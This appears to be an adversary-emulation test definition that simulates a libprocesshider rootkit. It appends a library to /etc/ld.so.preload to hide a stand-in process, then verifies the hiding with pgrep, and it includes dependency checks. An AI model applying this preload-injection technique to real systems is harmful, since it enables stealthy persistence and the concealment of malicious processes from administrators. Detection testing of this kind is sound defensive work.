name: dynamic-linker based rootkit (libprocesshider)
description: Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).

data.command:
echo #{library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"

steps.name: Check dependency 1/1
steps.description: The preload library must exist on disk at specified location (#{library_path})

data.command: if [ -f #{library_path} ]; then exit 0; else exit 1; fi;

steps.name: Resolve dependency 1/1
steps.description: The preload library must exist on disk at specified location (#{library_path})

steps.name: Re-check dependency 1/1
steps.description: The preload library must exist on disk at specified location (#{library_path})

data.command: if [ -f #{library_path} ]; then exit 0; else exit 1; fi;

input_arguments.name: repo
input_arguments.description: Url of the github repo zip

input_arguments.name: rev
input_arguments.description: Revision of the github repo zip

input_arguments.name: library_path
input_arguments.description: Full path of the library to add to ld.so.preload
